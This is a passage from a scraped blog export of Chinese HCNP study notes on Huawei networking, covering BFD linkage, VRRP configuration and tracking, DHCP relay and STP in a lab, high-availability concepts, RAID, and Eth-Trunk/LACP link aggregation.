discriminator local 123 discriminator remote 123 //这里配置的是单播地址所以可以配置相同的标识符 bfd 2 bind peer-ip 23.0.0.3 //多跳检测 Discriminator local 456 Discriminator remote 456 ip route-s 0.0.0.0 0 12.0.0.2 //添加静态路由 //AR2 配置 sys sys R2 int g0/0/0 ip add 12.0.0.2 24 bfd bfd 1 bind peer-ip 12.0.0.1 int G0/0/0 discriminator local 123 discriminator remote 123 //当配置的是组播地址（default-ip）时ID不可以一样 ========================================= bfd bfd 1 bind peer-ip 12.0.0.1 int G0/0/0 ? //以指定源地址出去，默认是从出接口地址出去的。 ========================================= int g0/0/1 ip add 23.0.0.2 24 sys sys R3 int g0/0/0 ip add 23.0.0.3 24 ip route-s 0.0.0.0 0 23.0.0.2 //添加静态路由 bfd bfd 1 bind peer-ip 12.0.0.1 discriminator local 456 discriminator remote 456 com 说明： 单跳需要配置接口，但是多跳不需要配置接口 配置时间间隔 A：我最小接收300，你最小发送600，以你600为准。 我最小发送800，你最小接收500，以我800为准。 相当于都取最大值。 B：同理 公式： A：5*（600）=3000 B：3*（800）=2400 BFD联动技术BFD配置命令 组播BFD会话与接口状态联动 dis ip int b //查看三层接口状态 //前提条件是单跳组播地址的会话才可以绑定接口状态 bfd 1 bind peer-ip default ip interface g0/0/1 process-interface-status com stp disable //关闭stp //联动接口状态绑定后，当shutdown一个接口（下边的一条路径），对应的BFD状态就变成了down状态，对应的静态路由变成了非激活状态。 //也可以设置成BFD状态导致物理层变为down， sys oam-mgr //oam 管理层的技术 oam-bind ingress bfd-session xxx trigger if-down egress interface gigabitethernet 0/0/1 //绑定物理层接口状态：Linux系统中输入事件绑定bfd会话的状态，输出事件是对应的接口变成down状态。 配置与静态路由联动 //配置AR1到AR2之间的静态路由，下边的两个交换机LSW4和LSW5没有进行配置 AR1: sys ip route-s 0.0.0.0 172.16.12.2 preference 61 //配置静态路由配置优先级 int g0/0/1 ip add 172.16.12.1 24 ip route-s 0.0.0.0 12.0.0.2 preference 61 track bfd-session 1 //联动静态路由 int g0/0/2 //进入接口 IP add 172.16.12.2 24 dis bfd session peer-ip 12.0.0.2 verbose //查看BFD单播会话详细信息。 配置联动OSPF动态路由dis port vlan //查看vlan ID 与接口配置信息 //当配置不通时也有可能是stp阻塞了 dis ospf pee b //查看ospf建立邻居 //在ospf进程下输入 BFD all interface enable //配置ospf联动接口，两端都要配置 dis bfd session all //查看BFD会话信息 配置与VRRP联动vrrp vrid 1 track bfd-session 10 //配置与vrrp联动 int vlanif 1 vrrp VRID 1 track BFD-session session-name 1 //配置BFD与vrrp联动 //vrrp注意的地方，当BFD配置的方式是静态的方式则，需要在 vrrp VRID 1 track BFD-session xxx //直接输入本地标识符xxx。 //也可以配置名称后面加session-name vrrp VRID 1 track BFD-session session name x //静态不支持vrrp绑定，必须都是静态。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"BFD","slug":"BFD","permalink":"http://sakuramuxia.github.io/tags/BFD/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记7","slug":"hcnp07","date":"2021-05-20T05:14:00.000Z","updated":"2021-05-22T04:40:46.361Z","comments":true,"path":"post/b97.html","link":"","permalink":"http://sakuramuxia.github.io/post/b97.html","excerpt":"","text":"VRRP配置 VRRP应用场景主备备份 负载均衡 VRRP配置 说明： 在同一个组，要保证配置的虚拟IP地址一样。 VRRP数据包结构 当Master Down了之后,出现的结果如下： 原因在于STP收敛需要时间，不是VRRP的问题。 监视当SW2的上行链路down掉了，不会引起VRRP的配置，Master和Backup不会发生改变。但是可以与上行服务器的通信，原因在于配置了ospf，路由收敛后会从右边走，但是过程就是从左边先走，然后回来再从右边走，绕路了，因此就需要监视。 监视的作用就是当Master的上行链路down掉了之后呢，能够将Master的位置让出来，让右边成为master，直接从右边走，不要再回来从右边走，实现的方法就是把Master的优先级减一定的值， int vlanif 10 vrrp vrid 10 track interface vlanif 2 reduce/add xxx //配置监视接口，以及配置自动减或加优先级。默认减10， dis vrrp interface vlanif 10 //直接查看VRRP接口的详细信息 三个优先级： priorityRun：实际的优先级，当为255时，代表虚拟地址和接口地址一样。 PriorityConfig：自己配置 MasterPriority：Master的优先级 VRRP vrid 10 track int g0/0/2 reducked 101 //配置接口监视自动减优先级101 dis vrrp interface vlanif 10 //直接查看VRRP接口的详细信息 利用路由技术\\BFD\\NQA监视 当遇到上行非直连的故障该怎么检测，我们可以用BFD或者用路由的方式进行检测， 实验环境如下： 当sw4与AR1之间的链路发生故障时，由于sw2的接口就检测不到了，等待路由收敛后，路径方向会先到sw4网关然后再回来，从右边的路由走，这样的设计就不合理。于是就需要监视这条路由。 ========================================== sw2 sys dis ospf routing //查看ospf路由 dis ip rou pro os //查看ospf路由信息 int vlanif 10 //进入vlan10接口 vrrp vrid 10 track ip route xxx.xxx.xxx.xxx 24 reduce 150 //跟踪xxx网段的路由，并且故障时，优先级减150. dis vrrp int vlan 10 //查看vlan110的vrrp接口信息 心跳线防止接入层链路不通或不稳定 接入层的链路，跟业务跑在一块了，假如组很多，有50个组有50个VRRP，这个时候有两种解决方案： 1、第一个是起一个心跳线，在心跳线里跑VRRP的状态。 2、 admin-vrrp vrid 10 建立管理组vrrp用于管理同一个VLAN流量走向 心跳线就是再加一个接口就是一条线，没有其他的命令，这个接口这要跟下面提供的vlanif一样的性质就行了，把心跳线配置一个trunk，跑VLAN10 或VLAN20 就可以了，但是这个时候就会产生一个问题就是环路。所以STP得配置，因为有一些交换机会阻止一些非法的组播流量，所以有些交换机可以丢弃一些未知的组播流量，所以有一些VRRP报文可能就过不去，也回不来，因此这时建议用心跳。 配置案例 说明： 这个配置中 一个接口下面有两个组。因为他下边的主机都是一个VLAN。 综合实验 实验基本环境要求： 1、配置交换和路由保证全网通 2、配置VRRP，VLAN10的流量优先走SW1，VLAN20的流量优先走SW2 3、配置VRRP监视上行链路 VLAN 10： 192.168.10.0 /24 GW： 192.168.10.254 //虚拟网关 VLAN 20： 192.168.20.0 /24 GW： 192.168.20.254 //虚拟网关 实际配置SW1配置sys sys SW1 vlan batch 10 20 int e0/0/1 p l a p d v 10 int e0/0/2 p l a p d v 20 int e0/0/3 p l t p t a v 10 20 int e0/0/4 p l t p t a v 10 20 int e0/0/3 //进入接口 stp config-digest-snoop //接口使能 STP cost 20000 //配置stp开销 stp priority 8192 // ================== dis p v //验证vlan配置 dis stp brief //验证SW1的g0/0/3和g0/0/4口为转发状态 dis stp //查看STP配置 STP disable //关闭STP ，原因在于下方图片，当Master挂了之后，由于STP收敛的时间较长，会造成数据包丢包，所以要关闭STP服务。 //百兆口的开销是200000，千兆口是20000，开销一样更改优先级，优先级的默认值32768，不能改0 或 4096，因为可能和SW2和SW3一样，优先级的ID为4096的倍数。 SW2配置sys sys SW2 vlan batch 10 20 int g0/0/1 p l t p t a v 10 20 int vlanif 10 IP add 192.168.10.252 24 int vlanif 20 ip add 192.168.20.252 24 STP root primary //配置SW2为主根桥 vlan 24 int g0/0/2 p l a p d v 24 int vlanif24 ip add 192.168.24.2 24 ospf 1 router-id 2.2.2.2 a 0 network 192.168.24.0 0.0.0.255 network 192.168.34.0 0.0.0.255 network 192.168.10.0 0.0.0.255 network 192.168.20.0 0.0.0.255 int g0/0/2 stp disable //关闭g0/0/2口的STP dhcp enable int vlanif 10 //进入VLAN10接口 dhcp select relay //配置dhcp服务中继 dhcp relay server-ip 192.168.24.4 dhcp relay server-ip 192.168.34.4//IP地址配制成目标设备的地址就行，中继可以写多个。 dhcp enable int vlanif 20 //进入VLAN20接口 dhcp select relay //配置dhcp服务中继 dhcp relay server-ip 192.168.24.4 dhcp relay server-ip 192.168.34.4/ int vlanif 10//进入vlan10，因为DHCP是应用层协议，肯定在虚拟三层口进行配置，为vlan10提供冗余网关 //undo portswitch 默认接口是二层，输入这个命令后，接口变成三层口，无法配置二层的配置。输入portswitch变成二层口。 //一个接口下面可以配置多个组，不同的接口可以配置不同的组，不同的接口可以配置相同的组，这里的组代表的是一个网关。 vrrp vrid 10 virtual-ip 192.168.10.254 //配置虚拟IP int vlanif 20 vrrp vrid 20 virtual-ip 192.168.20.254 dis vrrp brief //验证VRRP配置，其实这里两边只要有一边有虚拟IP，链路就通了。 arp - a //查看arp dis mac-ad //查看MAC地址，接入层交换机。 STP disable //关闭STP dis ospf peer b //查看ospf路由邻居，考虑路由层面回包的的问题，因为当左边的交换机down掉了，虽然VRRP会直接走右边，但是数据包回来的路径还是从左边回来的，所以要等路由收敛，收敛完成后，能从右边回包，完成通信，能够很快切换。 int vlanif10 vrrp vrid 10 priority 200 //配置优先级，使VLAN10成为负载均衡，254配置不了，后边说。 //当网络拥塞了，可能会频繁的切换Master，或者backup，所以要配置抢占延迟。备的抢占最好设置成0秒，主的抢占设置成5秒。默认开启抢占延迟。 int vlanif10 VRRP vrid 10 track int g0/0/2 reducked 101 //配置接口监视自动减优先级 ======================== //注意在这种情况下，SW1和SW2两个交换机都做了DHCP服务器，网关做了冗余，这两个交换机都要提供DHCP服务，以防一个挂了之后，主机要重新申请地址，这个时候就会出现一个分配的问题，比如说SW1分配一个IP地址给PC1，当SW1挂了之后，VLAN10中的主机于是就向SW2申请地址，SW2发现有个地址没有分配出去，就把IP地址分配出去，但是这个就会出现分配出相同的地址，因此微软推荐了一种方法就是IP地址池55开73开，保证地址不冲突。在实际的生产环境中，我们一般都会使用一个独立的服务器，或者是核心的交换机，来同一的分配，于是SW2SW3就要配置中继DHCPRelay,于是建议的方法是使用独立设备做Relay配置。 //DHCP要配置全局的地址池，不是接口地址池。而且全局地址池已经写好了，网关是254，不然以后拿到的网关还是252。所以DHCP放在SW2或SW3技术上可以，但是非常不便，还会有一些问题，所以还是放在一个独立的设备上。不建议 SW3配置sys sys SW3 vlan batch 10 20 int g0/0/1 p l t p t a v 10 20 int vlanif 10 IP add 192.168.10.253 24 int vlanif 20 ip add 192.168.20.253 24 STP root secondary //配置SW3为备份根桥 vlan 34 int g0/0/2 p l a p d v 34 int vlanif34 ip add 192.168.34.3 24 ospf 1 router-id 3.3.3.3 a 0 network 192.168.24.0 0.0.0.255 network 192.168.34.0 0.0.0.255 network 192.168.10.0 0.0.0.255 network 192.168.20.0 0.0.0.255 int g0/0/2 stp disable dis stp b //验证STP配置 dhcp enable int vlanif 10 //进入VLAN10接口 dhcp select relay //配置dhcp服务中继 dhcp relay server-ip 192.168.24.4 dhcp relay server-ip 192.168.34.4 dhcp enable int vlanif 20 //进入VLAN10接口 dhcp select relay //配置dhcp服务中继 dhcp relay server-ip 192.168.24.4 dhcp relay server-ip 192.168.34.4 int vlanif 10 vrrp vrid 10 virtual-ip 192.168.10.254 int vlanif 20 vrrp vrid 20 virtual-ip 192.168.20.254 STP disable //关闭STP服务 VRRP vrid 10 track int g0/0/2 reducked 101 //监视跟踪Master 说明： 如果SW4为根桥，则很有可能会阻塞SW1到SW3之间的链路，使用STP让SW2成为根桥，在实际生产环境中应该使用MSTP，SW3成为备份根桥，让STP阻塞SW4和SW3之间的链路。 SW4配置//SW4的网关做一下DHCP //上边的接口，我们应该处理成三层的接口，模拟器不支持物理三层，真机可以，所以我们用二层物理口+三层虚拟口， sys sys SW4 vlan bat 24 34 int g0/0/1 p l a p d v 24 int g0/0/2 p l a p d v 34 int vlanif24 ip add 192.168.24.4 24 int vlanif34 ip add 192.168.34.4 24 ospf 1 router-id 4.4.4.4 a 0 network 192.168.24.0 0.0.0.255 network 192.168.34.0 0.0.0.255 network 192.168.100.0 0.0.0.255 STP disable //关闭STP，因为他是核心交换机，基本都属于三层，没有二层链路，可以直接关闭， dis stp b //查看STP状态 IP pool vlan10 //创建VLAN10的IP地址池，为VLAN10提供DHCP服务，VLAN10 名字自定义 network 192.168.10.0 mask 255.255.255.0 //当为默认掩码时可以直接打回车，如24位 gateway-list 192.168.10.254 //你给他分配的网关是到时候真正要用到的网关。不是252，不是253，因为我们创建虚拟设备是254， IP pool VLAN20 network 192.168.20.0 gateway-list 192.168.20.254 ip pool vlan10//进入VLAN10地址池 excluded-ip-address 192.168.10.252 192.168.10.253 //排除地址池，因为可能会分配252,253的地址给主机就会造成冲突， d th dhcp enable //dhcp开启 int vlanif24//进入VLAN24 DHCP select global //配置全局 int vlanif34 dhcp select global//配置全局 VLAN 100 p l a p d v 100 int vlanif100 ip add 192.168.100.254 d th ================================= dis ip int b //验证接口IP接口 dis ospf routing //验证查看ospf路由 dis ip pool //验证地址池 由于STP的存在将SW3和SW4之间的链路阻断了，所以SW4ping不通SW3，查看ospf路由发现，34网段是直连的，但是走的仍然是被阻断的那一条链路，所以要不就把上层接口的STP关掉，要不就用Mstp，或者就把上边配置成纯的物理口。 完整拓扑配置 Updatesystem-view interface 10ge 1/0/1 undo negotiation disable //配置以太网接口工作在自协商模式 speed auto 100 //配置10GE1/0/1在自协商模式下协商速率为100Mbit/s //在单独的口关闭STP int g0/0/1 stp disable //查看接口光模块信息 int g0/0/1 //进入相关接口 d th //查看接口对应配置信息 dis interface transceiver verbose //查看接口光模块详细信息 //或直接打以下命令 display interface 10ge 1/0/1 transceiver verbose //查看光模块的诊断信息","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIP","slug":"HCIP","permalink":"http://sakuramuxia.github.io/tags/HCIP/"},{"name":"VRRP配置","slug":"VRRP配置","permalink":"http://sakuramuxia.github.io/tags/VRRP%E9%85%8D%E7%BD%AE/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记6","slug":"hcnp06","date":"2021-05-17T12:35:53.000Z","updated":"2021-05-17T13:01:43.311Z","comments":true,"path":"post/cb56.html","link":"","permalink":"http://sakuramuxia.github.io/post/cb56.html","excerpt":"","text":"VRRP局域网中的用户终端通常采用一个默认网关的形式访问外部网络，如果此时默认网关设备发生故障，将中断所有用户终端的网络访问，这很可能会给用户带来不可预计的损失，所以可以通过部署多个网关的方式来解决单点故障问题，那么如何让多个网关能够协同工作，但又不会互相冲突就成了最迫切需要解决的问题。 于是VRRP应运而生，它既可以实现网关的备份，又能解决多个网关之间互相冲突的问题，那么VRRP的工作原理是如歌实现的？在网络中又该如何配置呢？ 技术背景通常，一个网段内只有一个网关，因此一旦网关出现故障，该网段就被孤立。 对他们来说是透明的， VRRPVirtual Router Redundancy Protocol 虚拟路由器冗余协议 将多个物理网关加入到VRRP备份组中，由一个主（Master）和多个备（Backup）组成，功能上相当于一台虚拟网关。 虚拟网关具有一个虚拟IP地址，作为终端的网关IP地址。 两个版本：VRRPv2基于IPV4，VRRPv3基于IPv6。 当实际的主路由器挂了之后，会切换到右边。这个过程是备用路由器发送ARP到二层交换机，二层交换机再把接口的MAC地址转换成备用路由器的MAC地址。 ARP有代理ARP、免费ARP、 VRRP选举规则根据优先级，选举出Master，承担网关功能 当物理网关和虚拟网关一样时，这台物理网关直接称为Master，而且直接优先级255，且不能修改，这个就叫做IP地址拥有者。 如何查看是否是用虚拟网关这个技术呢，首先，查看254的mac地址，在ARP中查看是否是一个虚拟的MAC地址，其次是Tract命令，当tract的时候回显的是252，而网关配置的是254，这个时候就能发现是VRRP技术。但是当虚拟网关的地址和真实网关的地址是一样的时候就无法确认。 注意 255是无法配置的，他是保留使用的。只能在1~254之间配置。0不能配置，255不能配置，0是在将备用转化成主路由的时候用的，255，是当虚拟网关IP地址和真实路由器的网关地址相同时默认配置的。 技术深度和细节考察 如何检测使用的是VRRP技术1、查看arp中MAC地址是不是虚拟MAC地址的形式， 2、或者tracert 一个，查看第一跳是不是自己配置的网关，如果不是则代表是虚拟网关技术，如果是，另外再检查是不是虚拟MAC地址。 //配置命令 int VLAN 1 //进入vlanif三层口 VRRP ? // vrrp vrid 1 ? // 假设下边主机如果都用一个VLAN，用同一个网关，大量的流量走同一个路由器，就不合适，设备压力大了，链路压力也大了，因此我们需要做负载均衡，负载均衡是大家一起工作，主备是有主有备，因此在实际过程中下边的主机会有多个vlan，第一个主机对他来说，有主有备，第二个主机对他来说也是有主有备，整体来说就是负载均衡了。 虚拟MAC规则 IANA：掌管IP地址和域名的机构 0001：代表VRRP 最后一个就是VRID的编号对应的16进制。 两个主备路由器之间到交换机之间的连接，有一端必须被阻塞，否则交换机发送一个ARP，两个路由器都会回应，都会认为是主路由，就会出现脑裂现象，另一个解决办法就是两个路由器之间建立一个心跳检测线路。（服务器、数据库、集群里面、VRRP里面） VRRP报文格式IP协议号=112，组播地址=224.0.0.18（封装在IP头部后边的协议号，1、6、17、47、50、51） VRRP状态机制 间隔时间 1秒钟，抢占延迟0秒，可以更改。 VRRP工作流程 当有人称为Master，他就会立即发送一个免费ARP，来通知下面的这个接入的二层接入交换机，告诉他以后只要有人找虚拟MAC地址就来找我。 当左边的路由器发生问题后，发生故障，无法发送ARP，右边一直在监听，它默认左边会1秒发一次，右边负责监听，监听3个间隔，当定时器超时时，也就是3秒之后，副路由器未收到主路由器的报文，副路由器就会暂成为主路由器。 当副路由器成为Master后，它也会立即发送免费ARP，他会告诉下面的交换机更新MAC地址。 默认抢占模式是开启状态。 免费ARP有3大应用 检测冲突 ：自己问自己检测IP地址是否冲突 通告主备变换 ：在VRRP中，发生主备变换后，Master设备会广播发送一个免费ARP报文来通告发生了主备变换 通告新MAC地址 发送方更换网卡，MAC地址变化了，为了能够在动态ARP表项变化前通告网络中其他设备，发送方可以发送一个免费ARP VRRP定时器 VRRP设计方案注意事项Master应该和STP的根桥保持一致，否则会导致次优路径。 VRRP应用场景主备备份 主路由只能有一个，备用路由可以有多个。 负载均衡 建两个组，组1和组2，组1的网关是111，组2的网关是112，然后有一部分主机配置111，另一部分主机配置112，组1中SwitchA为Master，组2中SwitchB为Master，实际过程中，也不会这个设计，而是做不同网段的，不同VLAN的负载均衡。 典型场景 MSTP：不同的VLAN有自己独有的独立的根桥。 MSTP：我们会把一个VLAN映射到一个实例里面，所以我们在计算生成树的时候，是按照实例来计算的。设计不同生成树的位置，这样就可以让不同的VLAN走不同的链路，然后找到合适的网关。 VRRP监视上行链路当Master上行链路故障时，自动修改优先级（自废武功），重新选举Master 背景： 当上行链路故障时，不会进行自动主备切换，因为下边的链路仍然是通的。 track //跟踪 直接监视 利用路由技术/BFD/NQA监视（非直连） NQA 把监视的结果反馈给VRRP，VRRP再做出反应。技术联动 FHRPfirst hop redundancy protocol 首跳冗余协议 第一个和第三个都是思科私有的协议 HSRP和VRRP工作原理大致一样，但是GLBP非常强大，与前两种完全不一样，要实现负载均衡，得进行合理的配置，比如说，创建不同的组，不同的组作为不同VLAN的网关。 GLBP（Gateway Load Balance Protocol）网关负载均衡协议，自动的网关的负载均衡，思科私有，机制类似轮训，靠使用不同的虚拟MAC来做ARP响应。 配置同一个网关，进行动态负载均衡，自动选择 主机首先会发送ARP请求，比如说我们的网关全部都是一个地址，发送一个1.1，交换机会广播，交换机广播之后，这里面有一个角色的分配，AVG统一管理管理AVF，AVG也是有主有备用，实际转发数据的就是AVF，流量过来的时候谁来干活，由ACG来分配，每次 过来的ARP都是有AVG来做响应，但是我给你们每一次的响应不一样，一号主机我给你aaaa的MAC地址，二号主机我给你bbbb的Mac，三号主机我给cccc的Mac。这就实现了动态的负载均衡，这就是原理。 Weighted 配置权重，代表的是10个主机（数据包）里面有几个走哪边，另外几个走哪边。 host-dependent 配置一台主机永远用一个网关 round-robin 配置轮询，就是一个一个来 当SwitchA挂了，AVG会把他的身份让给之前他备份的AVG，备份AVG就会变成活动AVG，还有一个细节就是，他会把之前SwitchA（坏掉的交换机）分配的虚拟MAC，他会把原来的虚拟MAC拿过来，活动AVG也会响应这个MAC，流量就会从我这边走。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIP","slug":"HCIP","permalink":"http://sakuramuxia.github.io/tags/HCIP/"},{"name":"VRRP","slug":"VRRP","permalink":"http://sakuramuxia.github.io/tags/VRRP/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记5","slug":"hcnp05","date":"2021-05-14T16:20:53.000Z","updated":"2021-05-17T12:53:20.757Z","comments":true,"path":"post/ad7.html","link":"","permalink":"http://sakuramuxia.github.io/post/ad7.html","excerpt":"","text":"防火墙厂商产品介绍1、checkpoint（老牌） 2、juniper（有认证） 3、Cisco 4、palo alto 5、华为 （USG6530） 6、山石 （VFW01） 7、爱快防火墙 （免费） 说明： 可以把这些防火墙的镜像从虚拟机安装启动，就相当于有这样一台防火墙，可以作为一个虚拟防火墙，可以部署到一台X86的服务器上，就可以直接使用。 关键字搜索：企业防火墙魔力象限 说明： 山石防火墙默认账号和密码：均为hellstone 将山石防火墙挂在在虚拟机中通过查询IP地址，用浏览器登陆IP地址（https）使用web界面配置 show interface //linux查询IP地址 镜像文件 Checkpoint gala R80 public EA EA3.iso palo Alto Network PA VM ESX 8.0.0.exe 山石防火墙SD6000 VTWD1 -5 5RB11.iso dis arp | in e2 //mac地址过滤 dis ip pool interface vlanif108 used//查看IP地址池使用的IP地址 专门的防火墙课程 高可靠性集群在硬件中可以实现，在数据库中可以实现，在网络设备中可以实现，在操作系统中也可以实现。 在学习过程中很多专业术语，在以后做项目文档，聊天时，都要回去讲这些东西，技术背景，技术框架讲明白，优点，缺点，适用场景，解决方案有哪些 NA路搞通，NP保障性，管理性，安全性，设计性的东西； 在实际网络中，避免不了各种技术因素造成的网络故障和服务中断，因此， 提高系统容错能力，提高故障速度，降低故障对业务的影响，是提高系统可靠性的有效途径。 可靠性需求：根据其目标和实现方法的不同，可分为三个级别： 可靠性的度量： HA：High Availability，指一个产品或系统具有很高的可靠性，是一整套综合技术，主要包括冗余容错，链路保证，节点故障及流量工程。 不能频频出现故障 出现故障后能很快恢复 可靠性设计主要包括两个方面：设备可靠性：要求多设备能够堆叠组网，要求单设备具有电信级可靠性99.999%，支持双电源接入，支持双风扇等。 链路可靠性：体现在链路设计以及组网形态上，通常采用多链路上行，包括Eth-Trunk/LAG，双归上行等。 99.999% //一年内故障大约是5分钟 86400*365-86400*365*0.99999 //传统方向：金融、证券、互联网、运营商、游戏公司 //云计算 5个9 毫无价值毫无意义 云计算12个9 Eth-trunk：链路聚合 iStack/CSS：堆叠技术（华为）；盒式的交换机用的是IStack，机架式的交换机用的是CSS。稍微有一点技术上的区别，但是大致上都一样。自动的响应故障并且切换。 级联：把多个交换机用线连在一起，级联是没有任何功能上的提升。 堆叠和级联的区别，堆叠是二合一，管理上就管理一台设备，性能上二合一，级联性能上没有提升。 跨设备链路技术：双归路设计 LAG 二层必须开启STP，防止出现环路，三层不怕有环路出现。因为有TTL，三层中跑的是合理的路由设计，肯定会选择最有路由，不可能有环路，但是链路聚合在二层里面要用到，三层里面也可以用到，课程中主要将二层，因为二层里面的需求很大，因为二层这种环路设计都有STP，STP就会阻塞，那么我们要用到，该怎么办，所以这个时候我们会用到链路聚合，同时再加上VRRP，因为我们要用网关，网关有两个，我们到底要用哪一个，用左边的那个，左边的那个如果挂了，要切换到右边的，你得把下边服务器网关地址给换了，这是不可能去实现的，所以我们得提供一个稳定的网关地址，这个网关地址其实就是虚拟出来的，后边有两个真实的网关，所以这个叫做VRRP。 而如果有堆叠技术，我们可以把多个设备合为一个，通过链路聚合，这个是一根线，这个是一个设备，图形变成了这个样子，这个样子就没有环路了，单点设备，单条链路，就不会有环路出现了。就算开启STP也检测不出来阻塞状态，有了堆叠技术，就不需要STP和VRRP技术了。堆叠技术有一个致命伤： VNC //各厂商堆叠技术名称 思科：VSS 华三：IRF 华为：CSS 私有不公开 出问题，原厂，专业的工程师。 堆叠做集群 堆叠 心跳检测出现问题时，主备交换机都认为是主交换机时，就会出现脑裂。 //配置集群 拓展 ----------------------------------------- 云计算 云计算是先把虚拟化学好，虚拟化实际上是把IT三架马车，给虚拟化放到资源池里进行利用。 ---------------------------------------- 三驾马车：计算、网络、存储 云计算最底层就三种东西，计算、网络、存储。 ---------------------------------------- 计算资源：服务器（硬盘装一个操作系统即可）-CPU、内存、 网络资源：交换机、网卡、路由器、防火墙 存储资源：SAN、NAS、DAS 三种存储网络架构；RAID； NAS：群晖，网络附加存储（网络存储服务器）。 RAID：独立（廉价）磁盘冗余阵列（Redundant Array of Independent Disks） RAID 0 新建带区极大提升性能速度最快 大小累加 数据分散在多个硬盘中 RAID 1 新建镜像区 1:1备份 大小只有一半 只能两块 RAID 5 至少三个硬盘 相互校验 数据是分散在三块硬盘中 同时写入两块硬盘数据，并把校验放在另外一个硬盘中。有校验数据的存在，所以用硬盘数据的容量其实要去掉一块硬盘，RAID 5 是去掉一块硬盘的容量。5快1G的最终的容量就是4G 修复卷 重新激活。 RAID 6 有校验 RAID 10 是RAID1和RAID0的综合，RAID10 和RAID01 的优缺点和比较，RAID5和RAID6的区别，在生产环境中用RAID5好还是RAID10好。根据业务分析，应用场景选取。 虚拟化集群特性： 当其中一个物理机挂掉之后，他上边的虚拟机会跑到其他的物理机上重新启动。启动时间就是故障时间。 华为虚拟化的技术：HA VMWare特有技术：FT（fault Tolerance）故障转移， 实现零停机，零数据丢失，在其他主机上有影子虚拟机。 vCenter Server ：统一管理平台，把主机加入集群中。 Eth-Trunk链路聚合随着网络规模不断扩大，用户对骨干链路的带宽和可靠性提出了越来越高的要求，在传统技术中，常用更换高速率的接口板或更换支持高速率接口板的设备方式来增加带宽，但这种方案需要付出高额的费用，而且不够灵活。 采用链路聚合技术可以在不进行硬件升级的条件下，通过将多个物理接口捆绑为一个逻辑接口，来达到增加链路带宽的目的，在实现增大带宽目的的同时，链路聚合采用备份链路的机制，可以有效的提高设备之间链路的可靠性。 技术背景： Eth-Trunk：以太网链路聚合 将多条物理链路捆绑在一起成为一条逻辑链路 链路聚合对STP开销影响 链路聚合模式 捆绑=链路聚合 服务器是不支持LACP模式的 如果两端设备均支持LACP协议，推荐使用LACP模式链路聚合 如果对端设备不支持LACP协议，必须使用手工模式链路聚合 链路错连： int eth-Trunk 1 //创建一个聚合口 mode ? //选择模式 //然后将物理口加进来就可以了 //验证 手工链路聚合： Eth-Trunk的建立、成员接口的加入由手工配置，没有LACP的参与。 所有活动链路都参加数据的转发，平均分担流量。 LACP模式链路聚合 通过LACP报文进行协商，确定活动接口和非活动接口，即提供备份功能。 LACP负责维护链路状态，在聚合条件发生变化时，自动调整或解散链路聚合。 建立过程：发送LACPDU→确定主动端→确定活动接口 比较规则：值越小越优先（STP选择根桥、优先级、MAC地址、） ​ 主动端：系统优先级→MAC地址 ​ 活动接口：接口优先级→接口编号 抢占机制 为什么要配置抢占延迟： 1、首先是为了网络的收敛和流量的一致性。举个例子，有个流量在3口转发，我们流量的负载均衡就会根据算法，比如说根据源MAC，根据源地址，根据目标MAC，假设访问的是同一个主机，同一个MAC地址，MAC是固定的，那么对端不管是那台主机发送的流量，走的可能都是这条链路，但是如果说故障切换，抢过来了，那么会导致流量会从其他地方走，等价路由，负载均衡，是根据数据流来分担的，一组相同的数据包，永远走一条链路，不同的数据包走不同的链路，设计可以改，但是初衷是如果访问同一台主句，数据包都是从三个链路平均发过来的话，就会产生一个微妙的东西，就是数据包会发生乱序，你能保证数据包发送的123，到另一端的数据包也是123吗，有一条链路万一阻塞了呢，故障了呢，从一条链路发不可能是乱序的。这也是多路径的问题。在存储里面有一个叫做多路径问题。 现在学的是LAN WAN技术，后边的是IPSAN、FCSAN技术，S代表Storage的意思，服务器到存储有多条路径可以到达，这就是存储里面的一个典型的问题，叫做多路径问题，这个问题都是由厂商会提供一些专门的软件去解决它，毕竟为了可靠性， 链路聚合条件：所有参数 必须一致：接口数量、速率、双工方式、流控方式等。 聚合以后可以二层，也可以三层，三层就在新创建的聚合口配置IP地址即可。 负载分担机制： 负载分担方式： int Eth-trunk 1 //创建聚合口 1 load-balance ? //负载均衡方式 //默认使用的是源目IP方式 基于源目MAC它会通过一个异或的算法去计算 选择的问题： 如果左边的设备很少，就不能选择基于源MAC这种方式，因为它会使得很多数据都从一条链路过去，都压在一条链路上了。这时候可以选择目标MAC。 Eth-Trunk配置（手动） dis stp b //查看STP状态 dis port v // 作用：提高带宽，提高高可靠性。 两边的聚合链路ID不一定要保持一致，只对本地有效； workingMode：Normal 代表的是manual 说明： 手动创建聚合链路的时候只需要创建一个聚合口（其他保持默认），然后把接口加入即可。 当把两个接口进行聚合后的效果： STP查看后状态是逻辑的聚合口。 //配置命令 int eth-t 1 //创建聚合口 int g0/0/1 //进入对应的接口 eth-t 1 //加入聚合端口 --------------------------------- int eth-t 1 trunkport g0/0/1 to g0/0/1 //加入成员的另外一种方式 Eth-Trunk配置（LACP）在配置Eth-Trunk配置模式的时候需要把里面的成员都先退出，然后再配置模式，这也使得需要先配置模式，然后再配置成员。 int eth-trunk 1 //进入聚合口1 undo trunk g 0/0/0 to 0/0/3 //删除聚合口中的成员 mode lacp-static //更改为lacp静态模式 int g0/0/1 //进入对应接口 shutdown //关闭接口 undo shutdown //恢复接口 两种配置方式的结果对比（手动和LACP） 这两个之间最大的区别在于，手动配置的Eth-Trunk只能配置最大的带宽是多少，不能配置激活的链路个数是多少，而LACP配置的就可以配置。 在选择主动端，选择激活链路时，优先级一样，端口编号越小约优先。 谁是主动端，听谁的 配置系统优先级： lacp priority ? //在系统模式配置 //默认是32768，可以配置成32767，STP配置优先级的时候是以4096为一块。 int g0/0/0 //进入接口模式 lacp priority 3//配置接口的优先级 int eth 1 //进入聚合接口 lacp preempt delay 10 //配置lacp抢占延迟为10秒 LACP的好处是可以动态的检测，也可以选择主备，检测出错的接口。 交换机之间可以用，交换机路由器之间可以用，路由器之间可以用，服务器之间也可以用。 NIC Teaming 